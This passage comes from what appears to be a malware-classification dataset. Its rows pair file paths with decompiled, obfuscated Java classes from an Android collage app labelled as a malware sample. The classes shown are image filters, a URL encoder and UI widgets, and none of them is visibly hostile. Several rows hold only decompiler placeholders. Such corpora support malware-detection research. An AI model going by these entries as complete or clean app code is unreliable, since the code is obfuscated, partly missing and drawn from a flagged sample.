f){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Bitmap createBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);     Canvas canvas=new Canvas(createBitmap);     canvas.drawARGB(0,0,0,0);     Paint paint=new Paint();     paint.setAntiAlias(true);     paint.setColor(-16777216);     Rect rect=new Rect(0,0,width,height);     canvas.drawRoundRect(new RectF(rect),f,f,paint);     paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));     canvas.drawBitmap(bitmap,rect,rect,paint);     return createBitmap;   }   public Bitmap a(  Bitmap bitmap,  String str,  int i,  int i2,  int i3,  int i4,  int i5,  boolean z){     Bitmap createBitmap=Bitmap.createBitmap(bitmap.getWidth(),bitmap.getHeight(),bitmap.getConfig());     Canvas canvas=new Canvas(createBitmap);     canvas.drawBitmap(bitmap,0.0f,0.0f,(Paint)null);     Paint paint=new Paint();     paint.setColor(i3);     paint.setAlpha(i4);     paint.setTextSize(i5);     paint.setAntiAlias(true);     paint.setUnderlineText(z);     canvas.drawText(str,i,i2,paint);     return createBitmap;   }   public Bitmap c(  Bitmap bitmap,  int i){     int i2;     int i3;     int width=bitmap.getWidth();     int height=bitmap.getHeight();     int[] iArr=new int[width * height];     bitmap.getPixels(iArr,0,width,0,0,width,height);     double d=(3.14159d * i) / 180.0d;     int sin=(int)(256.0d * Math.sin(d));     int cos=(int)(Math.cos(d) * 256.0d);     for (int i4=0; i4 < height; i4++) {       for (int i5=0; i5 < width; i5++) {         int i6=(i4 * width) + i5;         int i7=(iArr[i6] >> 16) & 255;         int i8=(iArr[i6] >> 8) & 255;         int i9=iArr[i6] & 255;         int i10=(((i7 * 70) - (i8 * 59)) - (i9 * 11)) / 100;         int i11=(((i7 * (-30)) + (i8 * 41)) - (i9 * 11)) / 100;         int i12=(((i7 * (-30)) - (i8 * 59)) + (i9 * 89)) / 100;         int i13=(((i7 * 30) + (i8 * 59)) + (i9 * 11)) / 100;         int i14=((sin * i12) + (cos * i10)) / android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY;         int i15=((cos * i12) - (sin * i10)) / android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY;         int i16=((i14 * (-51)) - (i15 * 19)) / 100;         int i17=i14 + i13;         if (i17 < 0) {           i2=0;         }  else {           i2=i17 > 255 ? 255 : i17;         }         int i18=i13 + i16;         if (i18 < 0) {           i3=0;         }  else {           i3=i18 > 255 ? 255 : i18;         }         int i19=i13 + i15;         if (i19 < 0) {           i19=0;         }  else         if (i19 > 255) {           i19=255;         }         iArr[i6]=i19 | (i3 << 8) | (i2 << 16)| (-16777216);       }     }     Bitmap createBitmap=Bitmap.createBitmap(width,height,bitmap.getConfig());     createBitmap.setPixels(iArr,0,width,0,0,width,height);     return createBitmap;   }   public Bitmap g(  Bitmap bitmap){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     int[] iArr=new int[width * height];     bitmap.getPixels(iArr,0,width,0,0,width,height);     Random random=new Random();     for (int i=0; i < height; i++) {       for (int i2=0; i2 < width; i2++) {         int i3=(i * width) + i2;         iArr[i3]=Color.rgb(random.nextInt(255),random.nextInt(255),random.nextInt(255)) | iArr[i3];       }     }     Bitmap createBitmap=Bitmap.createBitmap(width,height,bitmap.getConfig());     createBitmap.setPixels(iArr,0,width,0,0,width,height);     return createBitmap;   }   public Bitmap h(  Bitmap bitmap){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     int[] iArr=new int[width * height];     bitmap.getPixels(iArr,0,width,0,0,width,height);     Random random=new Random();     for (int i=0; i < height; i++) {       for (int i2=0; i2 < width; i2++) {         int i3=(i * width) + i2;         int red=Color.red(iArr[i3]);         int green=Color.green(iArr[i3]);         int blue=Color.blue(iArr[i3]);         int nextInt=random.nextInt(255);         if (red < nextInt && green < nextInt && blue < nextInt) {           iArr[i3]=Color.rgb(0,0,0);         }       }     }     Bitmap createBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);     createBitmap.setPixels(iArr,0,width,0,0,width,height);     return createBitmap;   }   public Bitmap d(  Bitmap bitmap,  int i){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     int[] iArr=new int[width * height];     bitmap.getPixels(iArr,0,width,0,0,width,height);     for (int i2=0; i2 < height; i2++) {       for (int i3=0; i3 < width; i3++) {         int i4=(i2 * width) + i3;         iArr[i4]=iArr[i4] & i;       }     }     Bitmap createBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);     createBitmap.setPixels(iArr,0,width,0,0,width,height);     return createBitmap;   }   public Bitmap e(  Bitmap bitmap,  int i){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     int[] iArr=new int[width * height];     float[] fArr=new float[3];     bitmap.getPixels(iArr,0,width,0,0,width,height);     for (int i2=0; i2 < height; i2++) {       for (int i3=0; i3 < width; i3++) {         int i4=(i2 * width) + i3;         Color.colorToHSV(iArr[i4],fArr);         fArr[1]=fArr[1] * i;         fArr[1]=(float)Math.max(0.0d,Math.min(fArr[1],1.0d));         iArr[i4]=iArr[i4] | Color.HSVToColor(fArr);       }     }     Bitmap createBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);     createBitmap.setPixels(iArr,0,width,0,0,width,height);     return createBitmap;   }   public Bitmap f(  Bitmap bitmap,  int i){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     int[] iArr=new int[width * height];     float[] fArr=new float[3];     bitmap.getPixels(iArr,0,width,0,0,width,height);     for (int i2=0; i2 < height; i2++) {       for (int i3=0; i3 < width; i3++) {         int i4=(i2 * width) + i3;         Color.colorToHSV(iArr[i4],fArr);         fArr[0]=fArr[0] * i;         fArr[0]=(float)Math.max(0.0d,Math.min(fArr[0],360.0d));         iArr[i4]=iArr[i4] | Color.HSVToColor(fArr);       }     }     Bitmap createBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);     createBitmap.setPixels(iArr,0,width,0,0,width,height);     return createBitmap;   }   public Bitmap i(  Bitmap bitmap){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Matrix matrix=new Matrix();     matrix.preScale(1.0f,-1.0f);     Bitmap createBitmap=Bitmap.createBitmap(bitmap,0,height / 2,width,height / 2,matrix,false);     Bitmap createBitmap2=Bitmap.createBitmap(width,(height / 2) + height,Bitmap.Config.ARGB_8888);     Canvas canvas=new Canvas(createBitmap2);     canvas.drawBitmap(bitmap,0.0f,0.0f,(Paint)null);     canvas.drawRect(0.0f,height,width,height + 4,new Paint());     canvas.drawBitmap(createBitmap,0.0f,height + 4,(Paint)null);     Paint paint=new Paint();     paint.setShader(new LinearGradient(0.0f,bitmap.getHeight(),0.0f,createBitmap2.getHeight() + 4,1895825407,16777215,Shader.TileMode.CLAMP));     paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.DST_IN));     canvas.drawRect(0.0f,height,width,createBitmap2.getHeight() + 4,paint);     return createBitmap2;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.a\d.code","public class d {   static final String[] a={""%00"",""%01"",""%02"",""%03"",""%04"",""%05"",""%06"",""%07"",""%08"",""%09"",""%0a"",""%0b"",""%0c"",""%0d"",""%0e"",""%0f"",""%10"",""%11"",""%12"",""%13"",""%14"",""%15"",""%16"",""%17"",""%18"",""%19"",""%1a"",""%1b"",""%1c"",""%1d"",""%1e"",""%1f"",""%20"",""%21"",""%22"",""%23"",""%24"",""%25"",""%26"",""%27"",""%28"",""%29"",""%2a"",""%2b"",""%2c"",""%2d"",""%2e"",""%2f"",""%30"",""%31"",""%32"",""%33"",""%34"",""%35"",""%36"",""%37"",""%38"",""%39"",""%3a"",""%3b"",""%3c"",""%3d"",""%3e"",""%3f"",""%40"",""%41"",""%42"",""%43"",""%44"",""%45"",""%46"",""%47"",""%48"",""%49"",""%4a"",""%4b"",""%4c"",""%4d"",""%4e"",""%4f"",""%50"",""%51"",""%52"",""%53"",""%54"",""%55"",""%56"",""%57"",""%58"",""%59"",""%5a"",""%5b"",""%5c"",""%5d"",""%5e"",""%5f"",""%60"",""%61"",""%62"",""%63"",""%64"",""%65"",""%66"",""%67"",""%68"",""%69"",""%6a"",""%6b"",""%6c"",""%6d"",""%6e"",""%6f"",""%70"",""%71"",""%72"",""%73"",""%74"",""%75"",""%76"",""%77"",""%78"",""%79"",""%7a"",""%7b"",""%7c"",""%7d"",""%7e"",""%7f"",""%80"",""%81"",""%82"",""%83"",""%84"",""%85"",""%86"",""%87"",""%88"",""%89"",""%8a"",""%8b"",""%8c"",""%8d"",""%8e"",""%8f"",""%90"",""%91"",""%92"",""%93"",""%94"",""%95"",""%96"",""%97"",""%98"",""%99"",""%9a"",""%9b"",""%9c"",""%9d"",""%9e"",""%9f"",""%a0"",""%a1"",""%a2"",""%a3"",""%a4"",""%a5"",""%a6"",""%a7"",""%a8"",""%a9"",""%aa"",""%ab"",""%ac"",""%ad"",""%ae"",""%af"",""%b0"",""%b1"",""%b2"",""%b3"",""%b4"",""%b5"",""%b6"",""%b7"",""%b8"",""%b9"",""%ba"",""%bb"",""%bc"",""%bd"",""%be"",""%bf"",""%c0"",""%c1"",""%c2"",""%c3"",""%c4"",""%c5"",""%c6"",""%c7"",""%c8"",""%c9"",""%ca"",""%cb"",""%cc"",""%cd"",""%ce"",""%cf"",""%d0"",""%d1"",""%d2"",""%d3"",""%d4"",""%d5"",""%d6"",""%d7"",""%d8"",""%d9"",""%da"",""%db"",""%dc"",""%dd"",""%de"",""%df"",""%e0"",""%e1"",""%e2"",""%e3"",""%e4"",""%e5"",""%e6"",""%e7"",""%e8"",""%e9"",""%ea"",""%eb"",""%ec"",""%ed"",""%ee"",""%ef"",""%f0"",""%f1"",""%f2"",""%f3"",""%f4"",""%f5"",""%f6"",""%f7"",""%f8"",""%f9"",""%fa"",""%fb"",""%fc"",""%fd"",""%fe"",""%ff""};   public static String a(  String str){     StringBuffer stringBuffer=new StringBuffer();     int length=str.length();     for (int i=0; i < length; i++) {       char charAt=str.charAt(i);       if ('A' <= charAt && charAt <= 'Z') {         stringBuffer.append(charAt);       }  else       if ('a' <= charAt && charAt <= 'z') {         stringBuffer.append(charAt);       }  else       if ('0' <= charAt && charAt <= '9') {         stringBuffer.append(charAt);       }  else       if (charAt == ' ') {         stringBuffer.append('+');       }  else       if (charAt == '-' || charAt == '_' || charAt == '.' || charAt == '!' || charAt == '~' || charAt == '*' || charAt == '\'' || charAt == '(' || charAt == ')') {         stringBuffer.append(charAt);       }  else       if (charAt <= 127) {         stringBuffer.append(a[charAt]);       }  else       if (charAt <= 2047) {         stringBuffer.append(a[(charAt >> 6) | 192]);         stringBuffer.append(a[(charAt & '?') | android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS]);       }  else {         stringBuffer.append(a[(charAt >> '\f') | 224]);         stringBuffer.append(a[((charAt >> 6) & 63) | android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS]);         stringBuffer.append(a[(charAt & '?') | android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS]);       }     }     return stringBuffer.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.widget\a.code","public interface a { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.widget\CropView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@48ea150a"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.widget\GifMovieView.code","public class GifMovieView extends View {   private static final int DEFAULT_MOVIEW_DURATION=1000;   private int a;   private String b;   private Movie c;   private long d;   private int e;   private float f;   private float g;   private float h;   private int i;   private int j;   private volatile boolean k;   private boolean l;   public GifMovieView(  Context context){     this(context,null);   }   public GifMovieView(  Context context,  AttributeSet attributeSet){     this(context,attributeSet,0);   }   public GifMovieView(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     this.e=0;     this.k=false;     this.l=true;   }   public void setMovieResource(  int i){     this.a=i;     this.c=Movie.decodeStream(getResources().openRawResource(this.a));     requestLayout();   }   public void setMovieFile(  String str){     this.b=str;     File file=new File(str);     if (file.exists()) {       try {         BufferedInputStream bufferedInputStream=new BufferedInputStream(new FileInputStream(file),262144);         bufferedInputStream.mark(262144);         this.c=Movie.decodeStream(bufferedInputStream);       }  catch (      FileNotFoundException e) {       }       requestLayout();     }   }   public void setMovie(  Movie movie){     this.c=movie;     requestLayout();   }   public Movie getMovie(){     return this.c;   }   public void setMovieTime(  int i){     this.e=i;     invalidate();   }   public void setPaused(  boolean z){     this.k=z;     if (!z) {       this.d=SystemClock.uptimeMillis() - this.e;     }     invalidate();   }   @Override protected void onMeasure(  int i,  int i2){     int size;     int size2;     if (this.c != null) {       int width=this.c.width();       int height=this.c.height();       this.h=1.0f / Math.max((View.MeasureSpec.getMode(i) == 0 || width <= (size2=View.MeasureSpec.getSize(i))) ? 1.0f : width / size2,(View.MeasureSpec.getMode(i2) == 0 || height <= (size=View.MeasureSpec.getSize(i2))) ? 1.0f : height / size);       this.i=(int)(width * this.h);       this.j=(int)(height * this.h);       setMeasuredDimension(this.i,this.j);       return;     }     setMeasuredDimension(getSuggestedMinimumWidth(),getSuggestedMinimumHeight());   }   @Override protected void onLayout(  boolean z,  int i,  int i2,  int i3,  int i4){     super.onLayout(z,i,i2,i3,i4);     this.f=(getWidth() - this.i) / 2.0f;     this.g=(getHeight() - this.j) / 2.0f;     this.l=getVisibility() == 0;   }   @Override protected void onDraw(  Canvas canvas){     if (this.c != null) {       if (!this.k) {         a();         a(canvas);         invalidate();         return;       }       a(canvas);     }   }   private void a(){     long uptimeMillis=SystemClock.uptimeMillis();     if (this.d == 0) {       this.d=uptimeMillis;     }     int duration=this.c.duration();     if (duration == 0) {       duration=1000;     }     this.e=(int)((uptimeMillis - this.d) % duration);   }   private void a(  Canvas canvas){     this.c.setTime(this.e);     canvas.save(1);     canvas.scale(this.h,this.h);     this.c.draw(canvas,this.f / this.h,this.g / this.h);     canvas.restore();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.widget\InterceptLayout.code","!org.eclipse.jdt.core.dom.TypeDeclaration@16113f3"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.widget\InterceptLayout2.code","!org.eclipse.jdt.core.dom.TypeDeclaration@72dea040"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.widget\LogTextBox.code","public class LogTextBox extends TextView {   public LogTextBox(  Context context){     this(context,null);   }   public LogTextBox(  Context context,  AttributeSet attributeSet){     this(context,attributeSet,R.attr.textViewStyle);   }   public LogTextBox(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);   }   @Override protected MovementMethod getDefaultMovementMethod(){     return ScrollingMovementMethod.getInstance();   }   @Override public Editable getText(){     return (Editable)super.getText();   }   @Override public void setText(  CharSequence charSequence,  TextView.BufferType bufferType){     super.setText(charSequence,TextView.BufferType.EDITABLE);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.widget\MyImageView.code","public class MyImageView extends View {   static final int CLICK=3;   static final int DRAG=1;   private static final int INVALID_POINTER_ID=-1;   private static final int MAX_CLICK_DURATION=400;   static final int NONE=0;   static final int ZOOM=2;   boolean a;   float[] b;   float c;   float d;   Matrix e;   Matrix f;   int g;   PointF h;   PointF i;   float j;   Paint k;   private a l;   private final int m;   private float n;   private float o;   private float p;   private float q;   private float r;   private float s;   private long t;   private Drawable u;   private float v;   private float w;   private int x;   private float y; public interface a {   }   public void setImageBitmap(  Bitmap bitmap){     this.u=new BitmapDrawable(bitmap);     invalidate();   }   public Bitmap getImageBitmap(){     if (this.u != null) {       return ((BitmapDrawable)this.u).getBitmap();     }     return null;   }   public MyImageView(  Context context){     this(context,null,0);     this.u=getResources().getDrawable(R.drawable.icon);     this.u.setBounds(0,0,this.u.getIntrinsicWidth(),this.u.getIntrinsicHeight());   }   public MyImageView(  Context context,  int i,  Bitmap bitmap,  a aVar){     this(context,null,0);     this.l=aVar;     this.u=new BitmapDrawable(bitmap);     this.u.setAlpha(i);     this.k=new Paint(1);     this.k.setAntiAlias(true);     this.k.setStyle(Paint.Style.STROKE);     this.k.setStrokeJoin(Paint.Join.ROUND);     this.k.setStrokeCap(Paint.Cap.ROUND);     this.k.setAlpha(i);   }   public MyImageView(  Context context,  AttributeSet attributeSet){     this(context,attributeSet,0);   }   public MyImageView(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     this.a=false;     this.m=3;     this.b=null;     this.c=0.0f;     this.d=0.0f;     this.e=new Matrix();     this.f=new Matrix();     this.g=0;     this.h=new PointF();     this.i=new PointF();     this.j=1.0f;     this.x=-1;     this.y=1.0f;   }   @Override public boolean onTouchEvent(  MotionEvent motionEvent){     ay a2=ay.a(motionEvent);     try { switch (a2.b() & 255) { case 0:         this.f.set(this.e);       this.h.set(a2.c(),a2.d());     this.g=1;   this.b=null; this.t=Calendar.getInstance().getTimeInMillis(); if (a2.a() == 1) { this.a=true; }  else { this.a=false; } this.n=a2.c(); this.o=a2.d(); break; case 1: long timeInMillis=Calendar.getInstance().getTimeInMillis() - this.t; this.p=a2.c(); this.q=a2.d(); this.r=this.p - this.n; this.s=this.q - this.o; if (timeInMillis < 400 && this.r < 3.0f && this.s < 3.0f && a2.a() == 1 && this.a) { this.a=false; break; } break; case 2: if (this.g == 1) { this.e.set(this.f); this.e.postTranslate(a2.c() - this.h.x,a2.d() - this.h.y); invalidate(); break; }  else if (this.g == 2 && a2.a() == 2) { float b=b(a2); this.e.set(this.f); if (b > 10.0f) { float f=b / this.j; this.e.postScale(f,f,this.i.x,this.i.y); invalidate(); } if (this.b != null) { this.d=a(a2); this.e.postRotate(this.d - this.c,getMeasuredWidth() / 2,getMeasuredHeight() / 2); invalidate(); break; } } break; case 5: this.j=b(a2); this.f.set(this.e); a(this.i,a2); this.g=2; this.b=new float[4]; this.b[0]=a2.a(0); this.b[1]=a2.a(1); this.b[2]=a2.b(0); this.b[3]=a2.b(1); this.c=a(a2); break; case 6: this.g=0; this.b=null; break; } }  catch (Exception e) { } return true; } private float a(ay ayVar){ return (float)Math.toDegrees(Math.atan2(ayVar.b(0) - ayVar.b(1),ayVar.a(0) - ayVar.a(1))); } private float b(ay ayVar){ float a2=ayVar.a(0) - ayVar.a(1); float b=ayVar.b(0) - ayVar.b(1); return FloatMath.sqrt((a2 * a2) + (b * b)); } private void a(PointF pointF,ay ayVar){ pointF.set((ayVar.a(0) + ayVar.a(1)) / 2.0f,(ayVar.b(0) + ayVar.b(1)) / 2.0f); } @Override public void onDraw(Canvas canvas){ super.onDraw(canvas); try { Log.d(""DEBUG"",""X: "" + this.v + "" Y: ""+ this.w); canvas.drawBitmap(((BitmapDrawable)this.u).getBitmap(),this.e,this.k); }  catch (Exception e) { } } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.widget\ResizableImageView.code","public class ResizableImageView extends ImageView {   public ResizableImageView(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);   }   @Override protected void onMeasure(  int i,  int i2){     if (getDrawable() != null) {       setMeasuredDimension(View.MeasureSpec.getSize(i),(int)Math.ceil((r1 * r0.getIntrinsicHeight()) / r0.getIntrinsicWidth()));     }  else {       super.onMeasure(i,i2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage.widget\VerticalSeekBar.code","public class VerticalSeekBar extends SeekBar {   public VerticalSeekBar(  Context context){     super(context);   }   public VerticalSeekBar(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);   }   public VerticalSeekBar(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);   }   @Override protected void onSizeChanged(  int i,  int i2,  int i3,  int i4){     super.onSizeChanged(i2,i,i4,i3);   }   @Override protected synchronized void onMeasure(  int i,  int i2){     super.onMeasure(i2,i);     setMeasuredDimension(getMeasuredHeight(),getMeasuredWidth());   }   @Override protected void onDraw(  Canvas canvas){     canvas.rotate(-90.0f);     canvas.translate(-getHeight(),0.0f);     super.onDraw(canvas);   }   @Override public boolean onTouchEvent(  MotionEvent motionEvent){     if (!isEnabled()) {       return false;     } switch (motionEvent.getAction()) { case 0: case 1: case 2:       setProgress(getMax() - ((int)((getMax() * motionEvent.getY()) / getHeight())));     onSizeChanged(getWidth(),getHeight(),0,0);   break; } return true; } } "
